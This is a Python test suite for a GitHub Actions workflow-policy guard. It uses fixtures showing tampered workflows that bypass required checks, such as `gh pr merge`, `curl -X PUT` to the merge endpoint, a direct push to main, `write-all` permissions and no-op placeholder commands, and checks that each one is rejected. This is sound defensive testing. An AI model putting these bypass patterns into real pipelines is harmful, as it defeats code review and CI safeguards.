#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""workflow 策略 guard 的结构化检查测试（含负向案例）。

覆盖（每条负向案例都断言**实际失败行为**，而不是「文本里出现了某个词」）：
  * 只在注释里写 CANDIDATE_SYNC_ENABLED（无真实 job-level if）必须失败；
  * 改变门控条件表达式必须失败；
  * 删除验证步骤必须失败；
  * 绕过 required check（例如 gh pr merge / 直推 main）必须失败；
  * 必需 job 加 job-level if 或给验证步骤加可跳过的 if 必须失败；
  * 权限、来源绑定、图标 pin、persist-credentials 等约束必须生效。
"""
import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts" / "ci"))

import verify_workflow_policy as pol  # noqa: E402

ICONS_SHA = "f0f3bc2a44616885682ee5f0e5921540b964e2d8"

MANIFEST = {
    "schema": "mihomo-rules-required-checks",
    "version": 2,
    "workflow": ".github/workflows/pr-verify.yml",
    "checks": [
        {"name": n, "job_id": n, "workflow": ".github/workflows/pr-verify.yml",
         "source": {"app_slug": "github-actions", "app_id": 15368}}
        for n in ("general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard")
    ],
}

# 第六轮：可执行文件身份核验步骤（真实文件里的同名步骤的紧凑同形版本）
_RESOLVER_RUN = """      - name: exe
        run: |
          set -euo pipefail
          unset -f python3 python pip pip3 git grep cat test printf readlink cp mv ln install chmod 2>/dev/null || true
          unset BASH_ENV ENV || true
          _resolve() {
            local name="$1" path
            path="$(command -v -- "$name" 2>/dev/null || true)"
            case "$path" in
              /usr/*|/bin/*|/opt/*) ;;
              *) echo "bad $name"; exit 1 ;;
            esac
            test -x "$path" || exit 1
            readlink -f -- "$path"
          }
          PY_BIN="$(_resolve python3)"
          GIT_BIN="$(_resolve git)"
          test -n "$("$PY_BIN" -c 'import sys; print(sys.version_info[0])')"
          test -n "$("$GIT_BIN" --version)"
          {
            echo "PY_BIN=$PY_BIN"
            echo "GIT_BIN=$GIT_BIN"
          } >> "$GITHUB_ENV"
"""

PR_VERIFY = """name: General PR verification
on:
  pull_request:
    branches:
      - main
permissions:
  contents: read
jobs:
  general-pr-verify:
    name: general-pr-verify
    runs-on: ubuntu-latest
    steps:
      - name: sha
        run: |
          set -euo pipefail
          printf '%s' "a" | grep -Eq '^[0-9a-f]{40}$' || { echo bad; exit 1; }
      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head }}
          persist-credentials: false
      - uses: actions/checkout@v7
        with:
          repository: Hawaiine/Oasisic-Icons
          ref: f0f3bc2a44616885682ee5f0e5921540b964e2d8
          path: Oasisic-Icons
          persist-credentials: false
""" + _RESOLVER_RUN + """      - run: '"$PY_BIN" -m pip install pyyaml'
      - name: guard
        env:
          MIHOMO_ICON_REPO: ${{ github.workspace }}/Oasisic-Icons
        run: '"$PY_BIN" scripts/ci/verify_general_pr.py'
      - name: configs
        env:
          MIHOMO_ICON_REPO: ${{ github.workspace }}/Oasisic-Icons
        run: '"$PY_BIN" scripts/verify_configs.py'
      - run: '"$PY_BIN" scripts/verify_rulesets.py'
      - run: '"$PY_BIN" scripts/icon_urls.py'
      - run: '"$PY_BIN" scripts/readme_stats.py --check'
      - name: tests
        env:
          MIHOMO_ICON_REPO: ${{ github.workspace }}/Oasisic-Icons
        run: '"$PY_BIN" -m unittest discover -s scripts/tests'
  workflow-policy-guard:
    name: workflow-policy-guard
    runs-on: ubuntu-latest
    steps:
      - name: sha
        run: printf '%s' "a" | grep -Eq '^[0-9a-f]{40}$'
      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head }}
          persist-credentials: false
""" + _RESOLVER_RUN + """      - run: '"$PY_BIN" -m pip install pyyaml'
      - name: policy
        run: |
          "$PY_BIN" scripts/ci/verify_workflow_policy.py --json "$RUNNER_TEMP/workflow-policy.json"
          test -s "$RUNNER_TEMP/workflow-policy.json"
          "$PY_BIN" -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8")); assert d["ok"] is True, d' "$RUNNER_TEMP/workflow-policy.json"
  trusted-baseline-guard:
    name: trusted-baseline-guard
    runs-on: ubuntu-latest
    steps:
      - name: sha
        run: printf '%s' "a" | grep -Eq '^[0-9a-f]{40}$'
      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head }}
          persist-credentials: false
""" + _RESOLVER_RUN + """      - run: '"$PY_BIN" -m pip install pyyaml'
      - name: basecheck
        run: |
          "$GIT_BIN" cat-file -e "${PR_BASE_SHA}^{commit}"
          "$GIT_BIN" cat-file -e "${PR_HEAD_SHA}^{commit}"
      - name: baseline
        run: |
          set -euo pipefail
          if "$GIT_BIN" cat-file -e "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" 2>/dev/null; then
            "$GIT_BIN" show "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py" > "$RUNNER_TEMP/verify_policy_baseline.py"
            WANT="$("$GIT_BIN" rev-parse "${PR_BASE_SHA}:scripts/ci/verify_policy_baseline.py")"
          else
            "$GIT_BIN" show "${PR_HEAD_SHA}:scripts/ci/verify_policy_baseline.py" > "$RUNNER_TEMP/verify_policy_baseline.py"
            WANT="$("$GIT_BIN" rev-parse "${PR_HEAD_SHA}:scripts/ci/verify_policy_baseline.py")"
          fi
          test -s "$RUNNER_TEMP/verify_policy_baseline.py"
          test "$("$GIT_BIN" hash-object "$RUNNER_TEMP/verify_policy_baseline.py")" = "$WANT"
          grep -q -- "--base-sha" "$RUNNER_TEMP/verify_policy_baseline.py"
          grep -q -- "def main(" "$RUNNER_TEMP/verify_policy_baseline.py"
          "$PY_BIN" "$RUNNER_TEMP/verify_policy_baseline.py" --base-sha "${PR_BASE_SHA}" --head-sha "${PR_HEAD_SHA}" --repo-root . --json "$RUNNER_TEMP/trusted-baseline.json"
          test -s "$RUNNER_TEMP/trusted-baseline.json"
          "$PY_BIN" -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8")); assert d["ok"] is True, d; assert d["base_sha"] and d["head_sha"], d' "$RUNNER_TEMP/trusted-baseline.json"
"""

ROUTE_A_DAILY = """name: 每日规则同步（PR-first 唯一入口）
on:
  schedule:
    - cron: '0 22 * * *'
  workflow_dispatch:
permissions:
  contents: write
  pull-requests: write
  statuses: write
jobs:
  sync:
    uses: ./.github/workflows/candidate-pr-sync.yml
    with:
      reason: daily-sync
    permissions:
      contents: write
      pull-requests: write
      statuses: write
"""

CANDIDATE = """name: 候选分支更新（PR-first · Route A）
on:
  workflow_call:
  workflow_dispatch:
permissions:
  contents: read
env:
  CANDIDATE_BRANCH: candidate/rules-update
  BASE_BRANCH: main
jobs:
  gate:
    name: gate
    runs-on: ubuntu-latest
    outputs:
      enabled: ${{ steps.check.outputs.enabled }}
    steps:
      - id: check
        run: echo "enabled=false" >> "$GITHUB_OUTPUT"
  publish:
    name: publish
    needs: [gate]
    if: needs.gate.outputs.enabled == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
      statuses: write
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
          persist-credentials: false
      - run: git apply "$RUNNER_TEMP/candidate.patch"
      - run: python3 "$RUNNER_TEMP/trusted/candidate_sha.py" decide
      - run: git push origin "HEAD:refs/heads/${CANDIDATE_BRANCH}"
  lock:
    name: lock
    needs: gate
    if: needs.gate.outputs.enabled == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - run: python3 scripts/ci/gate_lock.py require-enabled
      - run: python3 scripts/ci/gate_lock.py acquire --base-sha x
  generate:
    name: generate
    needs: [gate, lock]
    if: needs.gate.outputs.enabled == 'true' && needs.lock.result == 'success'
    runs-on: ubuntu-latest
    steps:
      - run: echo generate
  finalize:
    name: finalize
    needs: [gate, lock, publish]
    if: always() && needs.lock.result == 'success'
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - env:
          GENERATE_CHANGED: ${{ needs.generate.outputs.changed }}
        run: python3 scripts/ci/gate_lock.py complete --result success || RC=$?
      - run: python3 scripts/ci/gate_lock.py pause --reason failed || RC=$?
  verify:
    name: verify
    needs: [gate, lock, generate, publish]
    runs-on: ubuntu-latest
    steps:
      - id: verify
        run: echo "state=success" >> "$GITHUB_OUTPUT"
      - if: steps.verify.outputs.state != 'success'
        run: exit 1
  request-auto-merge:
    name: request-auto-merge
    needs: [gate, publish]
    if: needs.gate.outputs.enabled == 'true' && vars.CANDIDATE_AUTOMERGE_ENABLED == 'true'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
      checks: read
      actions: read
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
          persist-credentials: false
      - name: wait
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: python3 scripts/ci/await_checks.py --repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" --expected-head-sha "${{ needs.publish.outputs.head_sha }}" --base-branch "$BASE_BRANCH" --timeout 900 --interval 15 --max-interval 60 --json "$RUNNER_TEMP/await-checks.json"
      - name: verify
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: python3 scripts/ci/verify_required_checks.py --repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" --head-sha "${{ needs.publish.outputs.head_sha }}" --json "$RUNNER_TEMP/required-checks.json"
      - name: automerge
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: python3 scripts/ci/request_automerge.py --repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" --head-sha "${{ needs.publish.outputs.head_sha }}" --json "$RUNNER_TEMP/automerge.json"
"""
_AWAIT_ARGS = ('--repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" '
               '--expected-head-sha "${{ needs.publish.outputs.head_sha }}" --base-branch "$BASE_BRANCH" '
               '--timeout 900 --interval 15 --max-interval 60 --json "$RUNNER_TEMP/await-checks.json"')
_VERIFY_ARGS = ('--repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" '
                '--head-sha "${{ needs.publish.outputs.head_sha }}" '
                '--json "$RUNNER_TEMP/required-checks.json"')
_AM_ARGS = ('--repo "${GITHUB_REPOSITORY}" --pr "${{ needs.publish.outputs.pr_number }}" '
            '--head-sha "${{ needs.publish.outputs.head_sha }}" --json "$RUNNER_TEMP/automerge.json"')
AWAIT_STEP = ("      - name: wait\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
              "        run: python3 scripts/ci/await_checks.py " + _AWAIT_ARGS + "\n")
VERIFY_STEP = ("      - name: verify\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
               "        run: python3 scripts/ci/verify_required_checks.py " + _VERIFY_ARGS + "\n")
AUTOMERGE_STEP = ("      - name: automerge\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
                  "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS + "\n")


def build_root(tmp: str, pr_verify: str = PR_VERIFY, candidate: str = CANDIDATE,
               manifest: object = None, legacy: str | None = ROUTE_A_DAILY,
               extra: dict | None = None, extra_files: dict | None = None) -> Path:
    root = Path(tmp)
    (root / ".github" / "workflows").mkdir(parents=True, exist_ok=True)
    (root / ".github" / "required-checks.json").write_text(
        json.dumps(MANIFEST if manifest is None else manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    (root / ".github" / "workflows" / "pr-verify.yml").write_text(pr_verify, encoding="utf-8")
    (root / ".github" / "workflows" / "candidate-pr-sync.yml").write_text(candidate, encoding="utf-8")
    if legacy is not None:
        (root / ".github" / "workflows" / "daily-sync.yml").write_text(legacy, encoding="utf-8")
    for fname, text in (extra or {}).items():
        (root / ".github" / "workflows" / fname).write_text(text, encoding="utf-8")
    for rel, text in (extra_files or {}).items():          # 任意仓库相对路径（含伪装脚本 fixture）
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


class Fixture(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self._tmp, ignore_errors=True)

    def problems(self, **kw) -> list[str]:
        root = build_root(self._tmp, **kw)
        problems, _ = pol.run(root)
        return problems

    def assertProblem(self, needle, **kw):
        problems = self.problems(**kw)
        self.assertTrue(any(needle in p for p in problems), f"未命中 {needle!r}：{problems}")
        return problems


class ValidLayoutTest(Fixture):
    def test_valid_layout_passes(self):
        self.assertEqual(self.problems(), [])

    def test_manifest_reports_expected_source(self):
        _, info = pol.run(build_root(self._tmp))
        self.assertEqual(info["required_checks"],
                         ["general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard"])
        self.assertEqual(info["expected_check_source"], {"app_slug": "github-actions", "app_id": 15368})


class GateStructureTest(Fixture):
    def test_comment_only_gate_is_rejected(self):
        """注释里出现 CANDIDATE_SYNC_ENABLED 不算门控（必须作用在解析后的 job if 上）。"""
        candidate = CANDIDATE.replace(
            "    if: needs.gate.outputs.enabled == 'true' && vars.CANDIDATE_AUTOMERGE_ENABLED == 'true'",
            "    # gated by vars.CANDIDATE_SYNC_ENABLED and vars.CANDIDATE_AUTOMERGE_ENABLED")
        self.assertProblem("request-auto-merge 必须门控于", candidate=candidate)

    def test_changed_condition_expression_is_rejected(self):
        candidate = CANDIDATE.replace(
            "    if: needs.gate.outputs.enabled == 'true' && vars.CANDIDATE_AUTOMERGE_ENABLED == 'true'",
            "    if: true")
        problems = self.assertProblem("request-auto-merge 必须门控于", candidate=candidate)
        self.assertTrue(any("CANDIDATE_AUTOMERGE_ENABLED" in p for p in problems), problems)

    def test_scheduled_writer_without_gate_is_rejected(self):
        candidate = CANDIDATE.replace("on:\n  workflow_call:\n  workflow_dispatch:",
                                      "on:\n  schedule:\n    - cron: '0 3 * * *'\n  workflow_dispatch:")
        problems = self.problems(candidate=candidate)
        self.assertTrue(any("schedule" in p for p in problems), problems)

    def test_publish_without_gate_is_rejected(self):
        candidate = CANDIDATE.replace("    if: needs.gate.outputs.enabled == 'true'\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write",
                                      "    runs-on: ubuntu-latest\n    permissions:\n      contents: write")
        problems = self.problems(candidate=candidate)
        self.assertTrue(any("publish" in p for p in problems), problems)


class LockOrderTest(Fixture):
    """锁序回归守卫：generate 必须在 lock 之后，finalize 必须能处理失败/取消。"""

    def test_generate_without_lock_is_rejected(self):
        candidate = CANDIDATE.replace("    needs: [gate, lock]\n    if: needs.gate.outputs.enabled == 'true' && needs.lock.result == 'success'",
                                      "    needs: [gate]\n    if: needs.gate.outputs.enabled == 'true'")
        problems = self.problems(candidate=candidate)
        self.assertTrue(any("generate 必须依赖 lock" in p for p in problems), problems)

    def test_finalize_without_always_is_rejected(self):
        candidate = CANDIDATE.replace("    if: always() && needs.lock.result == 'success'",
                                      "    if: needs.lock.result == 'success'")
        problems = self.problems(candidate=candidate)
        self.assertTrue(any("finalize 必须使用 always()" in p for p in problems), problems)

    def test_finalize_without_pause_is_rejected(self):
        candidate = CANDIDATE.replace(
            "      - run: python3 scripts/ci/gate_lock.py pause --reason failed || RC=$?\n", "")
        problems = self.problems(candidate=candidate)
        self.assertTrue(any("必须在非成功路径写 pause" in p for p in problems), problems)


class RequiredChecksTest(Fixture):
    def test_required_job_with_if_false_is_rejected(self):
        pr_verify = PR_VERIFY.replace("  workflow-policy-guard:\n    name: workflow-policy-guard\n",
                                      "  workflow-policy-guard:\n    name: workflow-policy-guard\n    if: false\n")
        self.assertProblem("不得设置 job-level if", pr_verify=pr_verify)

    def test_required_step_with_if_is_rejected(self):
        pr_verify = PR_VERIFY.replace(
            "      - name: policy\n        run: |\n",
            "      - name: policy\n        if: false\n        run: |\n")
        self.assertProblem("验证步骤不得带 if 条件", pr_verify=pr_verify)

    def test_removed_verification_step_is_rejected(self):
        pr_verify = PR_VERIFY.replace(
            "        run: '\"$PY_BIN\" scripts/ci/verify_general_pr.py'\n", "")
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("verify_general_pr" in p or "必需命令" in p for p in problems), problems)

    def test_job_id_mismatch_is_rejected(self):
        pr_verify = PR_VERIFY.replace("  general-pr-verify:\n    name: general-pr-verify\n",
                                      "  general-pr-verify:\n    name: general-verify-renamed\n")
        self.assertProblem("必须设置 name", pr_verify=pr_verify)

    def test_extra_job_is_rejected(self):
        pr_verify = PR_VERIFY + "  extra-job:\n    name: extra-job\n    runs-on: ubuntu-latest\n    steps: []\n"
        self.assertProblem("必须等于必需检查", pr_verify=pr_verify)

    def test_workflow_dispatch_in_pr_verify_is_rejected(self):
        pr_verify = PR_VERIFY.replace("on:\n  pull_request:\n", "on:\n  workflow_dispatch:\n  pull_request:\n")
        self.assertProblem("不得声明 workflow_dispatch", pr_verify=pr_verify)

    def test_non_exact_permissions_rejected(self):
        pr_verify = PR_VERIFY.replace("permissions:\n  contents: read\n",
                                      "permissions:\n  contents: read\n  pull-requests: read\n")
        self.assertProblem("permissions 必须恰为", pr_verify=pr_verify)

    def test_missing_required_check_in_manifest_rejected(self):
        manifest = dict(MANIFEST)
        manifest["checks"] = MANIFEST["checks"][:2]
        self.assertProblem("必须等于必需检查", manifest=manifest)


class SourceBindingTest(Fixture):
    def test_string_check_without_source_rejected(self):
        manifest = {"workflow": ".github/workflows/pr-verify.yml",
                    "checks": ["general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard"]}
        self.assertProblem("必须声明 source", manifest=manifest)

    def test_wrong_app_id_rejected(self):
        manifest = json.loads(json.dumps(MANIFEST))
        manifest["checks"][0]["source"]["app_id"] = 1
        self.assertProblem("source 必须为", manifest=manifest)

    def test_wrong_app_slug_rejected(self):
        manifest = json.loads(json.dumps(MANIFEST))
        manifest["checks"][1]["source"]["app_slug"] = "evil"
        self.assertProblem("source 必须为", manifest=manifest)

    def test_legacy_required_list_rejected(self):
        manifest = {"workflow": ".github/workflows/pr-verify.yml",
                    "required": ["general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard"]}
        self.assertProblem("缺少来源绑定", manifest=manifest)


class AutoMergeStructureTest(Fixture):
    def test_missing_verify_call_rejected(self):
        candidate = CANDIDATE.replace(VERIFY_STEP, "")
        self.assertProblem("verify_required_checks.py", candidate=candidate)

    def test_missing_await_call_rejected(self):
        candidate = CANDIDATE.replace(AWAIT_STEP, "")
        self.assertProblem("await_checks.py", candidate=candidate)

    def test_mutation_before_verification_rejected(self):
        candidate = CANDIDATE.replace(AWAIT_STEP + VERIFY_STEP + AUTOMERGE_STEP,
                                      AUTOMERGE_STEP + AWAIT_STEP + VERIFY_STEP)
        self.assertProblem("独立步骤", candidate=candidate)

    def test_wrong_automerge_permissions_rejected(self):
        candidate = CANDIDATE.replace("      pull-requests: write\n      checks: read\n", "      actions: write\n")
        problems = self.problems(candidate=candidate)
        self.assertTrue(any("permissions 必须恰为" in p or "actions: write" in p for p in problems), problems)


class PublishIsolationTest(Fixture):
    def test_publish_missing_pull_requests_write_rejected(self):
        """Route A：publish 必须恰为 contents/pull-requests/statuses write。"""
        candidate = CANDIDATE.replace(
            "    permissions:\n      contents: write\n      pull-requests: write\n      statuses: write\n    steps:",
            "    permissions:\n      contents: write\n      statuses: write\n    steps:")
        self.assertProblem("publish 权限必须恰为", candidate=candidate)

    def test_publish_with_app_token_rejected(self):
        """Route A：出现 App 认证路径即失败（不得偷偷切换认证）。"""
        candidate = CANDIDATE.replace("      - run: git apply",
                                      "      - uses: actions/create-github-app-token@v2\n"
                                      "        with:\n          app-id: ${{ secrets.PR_FIRST_APP_ID }}\n"
                                      "      - run: git apply")
        self.assertProblem("禁止 GitHub App 认证路径", candidate=candidate)

    def test_publish_checking_out_pr_head_rejected(self):
        candidate = CANDIDATE.replace("      - uses: actions/checkout@v7\n        with:\n          ref: main\n"
                                      "          persist-credentials: false\n      - run: git apply",
                                      "      - uses: actions/checkout@v7\n        with:\n"
                                      "          ref: ${{ github.event.pull_request.head.sha }}\n"
                                      "          persist-credentials: false\n      - run: git apply")
        self.assertProblem("publish 不得检出 PR head", candidate=candidate)

    def test_publish_running_repo_script_after_apply_rejected(self):
        candidate = CANDIDATE.replace("      - run: python3 \"$RUNNER_TEMP/trusted/candidate_sha.py\" decide",
                                      "      - run: python3 scripts/ci/candidate_sha.py decide")
        self.assertProblem("不得执行仓库脚本", candidate=candidate)

    def test_push_not_targeting_candidate_branch_rejected(self):
        candidate = CANDIDATE.replace('      - run: git push origin "HEAD:refs/heads/${CANDIDATE_BRANCH}"',
                                      "      - run: git push origin HEAD:refs/heads/some-other-branch")
        self.assertProblem("必须显式指向 refs/heads/$CANDIDATE_BRANCH", candidate=candidate)

    def test_actions_write_rejected(self):
        candidate = CANDIDATE.replace("permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: write\n")
        self.assertProblem("不得声明 actions: write", candidate=candidate)


class BypassTest(Fixture):
    def test_gh_pr_merge_rejected(self):
        candidate = CANDIDATE.replace(
            "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS,
            "        run: gh pr merge 1 --squash")
        self.assertProblem("gh pr merge", candidate=candidate)

    def test_rest_merge_endpoint_rejected(self):
        candidate = CANDIDATE.replace(
            "        run: python3 scripts/ci/request_automerge.py " + _AM_ARGS,
            "        run: curl -X PUT https://api.github.com/repos/o/r/pulls/1/merge")
        self.assertProblem("merge 端点", candidate=candidate)

    def test_pull_request_target_rejected(self):
        pr_verify = PR_VERIFY.replace("on:\n  pull_request:\n", "on:\n  pull_request_target:\n")
        self.assertProblem("pull_request_target 一律禁止", pr_verify=pr_verify)

    def test_write_all_rejected(self):
        pr_verify = PR_VERIFY.replace("permissions:\n  contents: read\n", "permissions: write-all\n")
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("write-all" in p for p in problems), problems)

    def test_persist_credentials_true_rejected(self):
        pr_verify = PR_VERIFY.replace("          persist-credentials: false\n", "          persist-credentials: true\n")
        self.assertProblem("persist-credentials: false", pr_verify=pr_verify)

    def test_icons_checkout_must_be_pinned(self):
        pr_verify = PR_VERIFY.replace(f"          ref: {ICONS_SHA}", "          ref: main")
        self.assertProblem("已批准 pin", pr_verify=pr_verify)

    def test_icons_checkout_with_floating_tag_is_rejected(self):
        pr_verify = PR_VERIFY.replace(f"          ref: {ICONS_SHA}", "          ref: v1.2.3")
        self.assertProblem("已批准 pin", pr_verify=pr_verify)

    def test_icons_checkout_with_pin_passes(self):
        self.assertEqual(self.problems(), [])


class DailySyncEntryTest(Fixture):
    """Route A：daily-sync.yml 是唯一入口，自身零写入。"""

    def _real(self) -> str:
        path = ROOT / ".github" / "workflows" / "daily-sync.yml"
        if not path.exists():
            self.skipTest("真实 daily-sync.yml 不存在")
        return path.read_text(encoding="utf-8")

    def test_real_entry_passes(self):
        legacy = self._real()
        problems, info = pol.run(build_root(self._tmp, legacy=legacy))
        self.assertEqual(problems, [])
        self.assertTrue(info["daily_sync_single_entry"])

    def test_direct_push_in_entry_rejected(self):
        legacy = self._real().replace(
            "jobs:\n  sync:", "jobs:\n  sync:\n    steps:\n      - run: git push origin HEAD:main\n")
        problems = pol.run(build_root(self._tmp, legacy=legacy))[0]
        self.assertTrue(any("唯一入口不得包含写操作" in p for p in problems), problems)

    def test_second_scheduled_workflow_rejected(self):
        problems = pol.run(build_root(
            self._tmp, extra={"second-sync.yml": "name: x\non:\n  schedule:\n    - cron: '0 1 * * *'\njobs: {}\n"}))[0]
        self.assertTrue(any("只允许" in p and "schedule" in p for p in problems), problems)

    def test_missing_entry_rejected(self):
        problems = pol.run(build_root(self._tmp, legacy=None))[0]
        self.assertTrue(any("缺少唯一入口文件" in p for p in problems), problems)

    def test_entry_not_calling_candidate_rejected(self):
        legacy = self._real().replace("uses: ./.github/workflows/candidate-pr-sync.yml", "uses: ./x.yml")
        problems = pol.run(build_root(self._tmp, legacy=legacy))[0]
        self.assertTrue(any("workflow_call" in p for p in problems), problems)


if __name__ == "__main__":
    unittest.main()


# --------------------------------------------------------------------------- P13
# (job, YAML 前缀, 命令体) —— 篡改只替换命令体，保留 YAML 结构合法
POLICY_CMD_BODY = ('"$PY_BIN" scripts/ci/verify_workflow_policy.py '
                   '--json "$RUNNER_TEMP/workflow-policy.json"')
BASELINE_CMD_BODY = ('"$PY_BIN" "$RUNNER_TEMP/verify_policy_baseline.py" '
                     '--base-sha "${PR_BASE_SHA}" --head-sha "${PR_HEAD_SHA}" --repo-root . '
                     '--json "$RUNNER_TEMP/trusted-baseline.json"')
JOB_ORDER = ("general-pr-verify", "workflow-policy-guard", "trusted-baseline-guard")
JOB_PREFIX = {"general-pr-verify": "        run: ",
              "workflow-policy-guard": "          ",
              "trusted-baseline-guard": "          "}
JOB_WRAP = {"general-pr-verify": True,          # 普通标量 → 需要 YAML 单引号包裹
            "workflow-policy-guard": False,      # 已在块标量内
            "trusted-baseline-guard": False}
JOB_INNER = {"general-pr-verify": '"$PY_BIN" scripts/ci/verify_general_pr.py',
             "workflow-policy-guard": POLICY_CMD_BODY,
             "trusted-baseline-guard": BASELINE_CMD_BODY}


def yaml_scalar(cmd: str, wrap: bool) -> str:
    """命令文本 → 可直接接在 `run: ` 之后的 YAML 标量（块标量内容不需要包裹）。"""
    if not wrap:
        return cmd
    assert not cmd.startswith("'"), f"已包裹：{cmd!r}"
    return "'" + cmd + "'"


def job_cmd(job: str, inner: str) -> str:
    """按该 job 的 YAML 形态渲染命令行（用于构造替换文本）。"""
    return JOB_PREFIX[job] + yaml_scalar(inner, JOB_WRAP[job])


JOB_COMMANDS = [(job, JOB_PREFIX[job], yaml_scalar(JOB_INNER[job], JOB_WRAP[job]))
                for job in JOB_ORDER]
GENERAL_CMD = "run: " + yaml_scalar(JOB_INNER["general-pr-verify"], True)
CONFIGS_CMD = "run: " + yaml_scalar('"$PY_BIN" scripts/verify_configs.py', True)
JOBS_INTERP = {job: '"$PY_BIN"' for job in JOB_ORDER}
JOBS_TARGET = {
    "general-pr-verify": "scripts/ci/verify_general_pr.py",
    "workflow-policy-guard": "scripts/ci/verify_workflow_policy.py",
    "trusted-baseline-guard": '"$RUNNER_TEMP/verify_policy_baseline.py"',
}
POLICY_CMD = "          " + POLICY_CMD_BODY
BASELINE_CMD = BASELINE_CMD_BODY
UNITTEST_CMD = "run: " + yaml_scalar('"$PY_BIN" -m unittest discover -s scripts/tests', True)
README_CMD = "run: " + yaml_scalar('"$PY_BIN" scripts/readme_stats.py --check', True)
PIP_CMD = "run: " + yaml_scalar('"$PY_BIN" -m pip install pyyaml', True)
VERIFIED_PIP_CMD = "'\"$PY_BIN\" -m pip install pyyaml'"
CATFILE_CMD = '"$GIT_BIN" cat-file -e "${PR_BASE_SHA}^{commit}"'


def replace_step(text: str, step_name: str, new_step: str) -> str:
    """整体替换 pr-verify.yml 中某个 `      - name: <step_name>` 步骤（含其后内容）。"""
    start = text.index(f"      - name: {step_name}\n")
    nxt = text.find("\n      - ", start + 1)
    end = nxt + 1 if nxt != -1 else len(text)
    return text[:start] + new_step + text[end:]


def swap(text: str, needle: str, replacement: str) -> str:
    """替换（要求命中，避免静默无效的 fixture）。"""
    assert needle in text, f"fixture 未命中：{needle!r}"
    return text.replace(needle, replacement)


class CommandContractTest(Fixture):
    """Fix B：必需命令必须**真正执行**；空跑/执行语义绕过必须被拒绝（三个必需 job 逐一覆盖）。"""

    def each_job(self):
        """(job, 命令行前缀, 命令文本)——命令文本**未加 YAML 引号**，便于构造替换文本。"""
        return [(job, JOB_PREFIX[job], JOB_INNER[job]) for job in JOB_ORDER]

    def orig(self, job: str) -> str:
        return job_cmd(job, JOB_INNER[job])

    def expect_rejected(self, pr_verify: str, job: str):
        problems = self.problems(pr_verify=pr_verify)
        self.assertTrue(any("没有被实际执行" in p or "缺少必需命令" in p for p in problems),
                        f"{job}: {problems}")
        return problems

    def test_echo_not_executed_rejected_for_every_required_job(self):
        for job, prefix, body in self.each_job():
            with self.subTest(job=job):
                repl = job_cmd(job, 'echo "NOT EXECUTED: ' + body + '"')
                self.expect_rejected(swap(PR_VERIFY, self.orig(job), repl), job)

    def test_printf_placeholder_rejected_for_every_required_job(self):
        for job, prefix, body in self.each_job():
            with self.subTest(job=job):
                repl = job_cmd(job, 'printf "%s\\n" "placeholder"')
                self.expect_rejected(swap(PR_VERIFY, self.orig(job), repl), job)

    def test_comment_only_rejected_for_every_required_job(self):
        for job, prefix, body in self.each_job():
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, self.orig(job), job_cmd(job, f"# {body}")), job)

    def test_quoted_text_only_rejected_for_every_required_job(self):
        """把命令塞进引号里的说明文本（不执行）。"""
        for job, prefix, body in self.each_job():
            with self.subTest(job=job):
                repl = job_cmd(job, '"' + body + '"')
                self.expect_rejected(swap(PR_VERIFY, self.orig(job), repl), job)

    def test_true_placeholder_rejected_for_every_required_job(self):
        for job, prefix, body in self.each_job():
            with self.subTest(job=job):
                problems = self.problems(pr_verify=swap(PR_VERIFY, self.orig(job),
                                                        job_cmd(job, "true")))
                self.assertTrue(any("缺少必需命令" in p or "没有被实际执行或路径身份不符" in p
                                    for p in problems), f"{job}: {problems}")

    def test_pipe_true_swallowing_rejected_for_every_required_job(self):
        for job, prefix, body in self.each_job():
            with self.subTest(job=job):
                self.expect_rejected(swap(PR_VERIFY, self.orig(job),
                                          job_cmd(job, body + " || true")), job)

    def test_conditional_branch_rejected(self):
        pr_verify = swap(PR_VERIFY, GENERAL_CMD,
                         "run: " + yaml_scalar('if false; then "$PY_BIN" '
                                               'scripts/ci/verify_general_pr.py; fi', True))
